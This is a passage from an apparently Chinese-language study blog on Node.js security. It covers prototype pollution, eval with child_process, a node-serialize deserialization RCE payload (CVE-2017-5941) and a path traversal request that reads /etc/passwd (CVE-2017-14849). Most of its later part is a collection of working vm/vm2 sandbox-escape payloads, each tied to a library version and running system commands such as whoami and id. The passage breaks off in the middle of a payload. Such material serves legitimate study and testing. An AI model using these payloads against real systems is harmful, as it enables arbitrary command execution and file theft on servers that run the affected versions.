的实例。</p><p>总结一下</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><ul><li><p>JS原型链继承</p><p>  所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();</span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a);</span><br><span class="line"><span class="built_in">console</span>.log(o.b);</span><br><span class="line"><span class="built_in">console</span>.log(o.c);</span><br><span class="line"><span class="built_in">console</span>.log(o.d);</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2020/06/nodejs学习/image-20200605162929085.png" alt="image-20200605162929085"></p><p>console.log(o.b);打印了2 似乎没被影响，其实这是个<code>属性遮蔽</code> 当要访问b属性时，对象先在自身的属性中寻找b，如果不存在b,才会到 <code>__proto__</code>中寻找，一层层往上，直到找到b或者null</p><p>总结一下</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><ul><li><p>原型链污染</p><p>  原型链污染就是修改了类的 <code>prototype</code>那么将可以影响所有和这个对象来自同一个类、父祖类的对象</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure></li></ul><ul><li>哪些情况下存在原型链污染<ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul></li></ul><p>简单例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p><img src="/2020/06/nodejs学习/image-20200605165118904.png" alt="image-20200605165118904"></p><p>需要注意的是一定要使用JSON格式，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>我们用JavaScript创建o2的过程，如果使用（<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code>），<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><h2 id="2-危险函数"><a href="#2-危险函数" class="headerlink" title="2.危险函数"></a>2.危险函数</h2><p>eval()</p><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p><p>漏洞利用</p><p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p><p>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code>来执行命令</p><p>类似命令</p><p>间隔两秒执行函数：</p><ul><li>setInteval(some_function, 2000)</li></ul><p>两秒后执行函数：</p><ul><li>setTimeout(some_function, 2000);</li></ul><p>some_function处就类似于eval函数的参数</p><p>输出HelloWorld：</p><ul><li>Function(“console.log(‘HelloWolrd’)”)()</li></ul><p>类似于php中的create_function</p><h2 id="3-node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#3-node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="3.node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>3.node-serialize反序列化RCE漏洞(CVE-2017-5941)</h2><ul><li>了解什么是IIFE：</li></ul><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/立即执行函数表达式" target="_blank" rel="noopener">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p><p>IIFE一般写成下面的形式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure><ul><li><p><code>node-serialize@0.0.4</code>漏洞点</p><p>  漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p><p>  <img src="/2020/06/nodejs学习/image-20200605172038278.png" alt="image-20200605172038278"></p></li></ul><p>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function(){}()</code>函数，在反序列化时就会被当中IIFE立即调用执行</p><ul><li>构造Payload</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line"> rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'ls /'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123;<span class="built_in">console</span>.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"序列化生成的 Payload: \n"</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure><p>生成的Payload为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;"</span>&#125;</span><br></pre></td></tr></table></figure><p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"</span>&#125;</span><br></pre></td></tr></table></figure><p>传递给unserialize(注意转义单引号)：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"rce":"_$$ND_FUNC$$_function()&#123;require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"&#125;'</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure><p><img src="/2020/06/nodejs学习/image-20200605172508592.png" alt="image-20200605172508592"></p><h2 id="4-Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#4-Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="4.Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>4.Node.js 目录穿越漏洞复现(CVE-2017-14849)</h2><p>漏洞影响的版本：</p><ul><li><p>Node.js 8.5.0 + Express 3.19.0-3.21.2</p></li><li><p>Node.js 8.5.0 + Express 4.11.0-4.15.5</p><p>  Express依赖Send组件，Send组件0.11.0-0.15.6版本pipe()函数中，如图：</p></li></ul><p><img src="/2020/06/nodejs学习/image-20200605211132980.png" alt="image-20200605211132980"></p><p>Send模块通过<code>normalize(&#39;.&#39; + sep + path)</code>标准化路径path后，并没有赋值给path，而是仅仅判断了下是否存在目录跳转字符。如果我们能绕过目录跳转字符的判断，就能把目录跳转字符带入545行的<code>join(root, path)</code>函数中，跳转到我们想要跳转到的目录中，这是Send模块的一个bug，目前已经修复。</p><p>再来看Node.js，Node.js 8.5.0对path.js文件中的<code>normalizeStringPosix</code>函数进行了修改，使其能够对路径做到如下的标准化：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>.strict<span class="constructor">Equal(<span class="params">path</span>.<span class="params">posix</span>.<span class="params">normalize</span>('<span class="params">bar</span><span class="operator">/</span><span class="params">foo</span>..<span class="operator">/</span>..')</span>, 'bar');</span><br></pre></td></tr></table></figure><p>新的修改带来了问题，通过单步调试我们发现，可以通过<code>foo../../</code>和目录跳转字符一起注入到路径中，<code>foo../../</code>可以把变量<code>isAboveRoot</code>设置为<code>false</code>（代码161行），并且在代码135行把自己删掉；变量<code>isAboveRoot</code>为<code>false</code>的情况下，可以在<code>foo../../</code>两边设置同样数量的跳转字符，让他们同样在代码135行把自己删除，这样就可以构造出一个带有跳转字符，但是通过<code>normalizeStringPosix</code>函数标准化后又会全部自动移除的payload，这个payload配合上面提到的Send模块bug就能够成功的返回一个我们想要的物理路径，最后在Send模块中读取并返回文件。</p><p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p><p><img src="/2020/06/nodejs学习/image-20200605220006573.png" alt="image-20200605220006573"></p><h2 id="5-VM沙箱逃逸"><a href="#5-VM沙箱逃逸" class="headerlink" title="5.VM沙箱逃逸"></a>5.VM沙箱逃逸</h2><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序，但是安全性让人捉急。逃逸后可获取主程序环境中的<a href="https://zhuanlan.zhihu.com/p/53135129" target="_blank" rel="noopener">环境变量</a>，然后通过各种方法导出 <code>Function</code>对象(上下文环境是主程序的)，接着借助<code>chile_process.exec()</code>就可以执行任意命令了</p><p>一下payload大都来自vm2的<a href="https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed" target="_blank" rel="noopener">issue</a></p><p>vm2&lt;=3.9.2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('whoami').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.9.1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;NodeVM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> NodeVM();</span><br><span class="line"><span class="built_in">console</span>.log(vm.run(<span class="string">'('</span>+<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">trueprocess = setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).ref().constructor.constructor(<span class="string">'return process'</span>)();</span><br><span class="line"><span class="built_in">console</span>.log(process.mainModule.require(<span class="string">'child_process'</span>).execSync(<span class="string">'ls'</span>).toString())&#125;+<span class="string">')()'</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure><p>3.7.0&lt;=vm2&lt;=3.8.3</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrue<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">true&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e.get_process(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">truetruetruegetOwnPropertyDescriptor()&#123;</span><br><span class="line">truetruetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">truetruetrue&#125;</span><br><span class="line">truetrue&#125;));</span><br><span class="line">true&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.7.0&lt;=vm2&lt;=3.8.2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">Symbol</span> = &#123;</span><br><span class="line">truetrue<span class="keyword">get</span> toStringTag()&#123;</span><br><span class="line">truetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)()</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Map</span>());</span><br><span class="line">true&#125;<span class="keyword">catch</span>(f)&#123;</span><br><span class="line">truetrue<span class="built_in">Symbol</span> = &#123;&#125;;</span><br><span class="line">truetrue<span class="keyword">return</span> f(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.6.7&lt;=vm2&lt;=3.6.9</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""),"",&#123;</span></span><br><span class="line"><span class="string">value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">if(this.t)</span></span><br><span class="line"><span class="string">throw Buffer.from;</span></span><br><span class="line"><span class="string">this.t=true;</span></span><br><span class="line"><span class="string">return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.6.8</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""), "", &#123;value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">delete this.getPrototypeOf;</span></span><br><span class="line"><span class="string">Object.defineProperty(Object.prototype, "get", &#123;</span></span><br><span class="line"><span class="string">get()&#123;</span></span><br><span class="line"><span class="string">delete Object.prototype.get;</span></span><br><span class="line"><span class="string">Function.prototype.__proto__ = null;</span></span><br><span class="line"><span class="string">throw f=&gt;f.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.6.7</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.getOwnPropertyDescriptor(</span></span><br><span class="line"><span class="string">Buffer.from.__lookupGetter__("__proto__").call(Buffer.from),</span></span><br><span class="line"><span class="string">"constructor").value("return process")().mainModule.require(</span></span><br><span class="line"><span class="string">"child_process").execSync("whoami").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2=3.6.6</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.__defineGetter__(Symbol.hasInstance,()=&gt;()=&gt;true);</span></span><br><span class="line"><span class="string">Buffer.from.constructor("return process")().mainModule.require("child_process").execSync("id").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.6.6</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">Object.prototype.has=(t,k)=&gt;&#123;</span></span><br><span class="line"><span class="string">process = t.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"" in Buffer.from;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.6.5</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""), "", &#123;get 